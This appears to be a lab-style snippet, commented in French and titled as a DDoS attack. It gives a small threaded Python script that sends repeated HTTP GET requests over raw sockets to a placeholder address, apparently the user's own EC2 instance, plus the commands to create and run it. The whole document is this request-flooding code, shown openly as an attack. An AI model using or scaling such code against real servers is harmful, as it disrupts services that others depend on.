#attaque Ddos
#crée un shell qui va contenir le script
vim fichier.py
#crée un script python capable de lancer simultanement des requetes ciblé
import socket
import threading

# Fonction pour envoyer les requêtes en boucle via un socket
def send_requests(socket_num, num_requests):
    # Adresse IP publique de votre instance EC2
    ec2_public_ip = "<votre_adresse_ip_publique>"
    port = 80  # Port HTTP par défaut

    print(f"Socket {socket_num}: Sending {num_requests} requests to {ec2_public_ip}...")
    try:
        # Création d'un socket TCP/IP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ec2_public_ip, port))

        for _ in range(num_requests):
            # Construire la requête HTTP GET
            request = f"GET / HTTP/1.1\r\nHost: {ec2_public_ip}\r\n\r\n"
            s.sendall(request.encode())

            # Recevoir la réponse (peut-être vide si le serveur ne renvoie pas de contenu)
            response = s.recv(1024)
            # Afficher la réponse pour vérification
            print(f"Socket {socket_num}: Response received: {response.decode()}")

        # Fermer la connexion
        s.close()
    except Exception as e:
        print(f"Socket {socket_num}: An error occurred: {str(e)}")

# Nombre de requêtes à envoyer par socket (simule la surcharge)
num_requests = 50

# Créer deux threads pour envoyer les requêtes via deux sockets différents
threads = []
for socket_num in range(2):
    thread = threading.Thread(target=send_requests, args=(socket_num + 1, num_requests))
    threads.append(thread)
    thread.start()

# Attendre que tous les threads aient terminé
for thread in threads:
    thread.join()

print("Server testing complete.")
#executer le fichier.py
python3 fichier.py